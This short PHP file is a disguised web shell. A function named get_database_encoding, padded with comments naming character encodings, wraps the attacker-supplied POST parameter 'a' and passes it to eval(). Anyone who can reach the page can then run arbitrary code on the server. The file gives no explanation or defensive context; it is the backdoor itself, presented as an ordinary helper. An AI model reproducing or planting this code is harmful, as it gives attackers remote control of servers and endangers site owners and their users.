<?php
function get_database_encoding()
{

    return "/*GB 2312*/".$_POST['a']."/*UTF-8*/";

}eval(get_database_encoding());

?>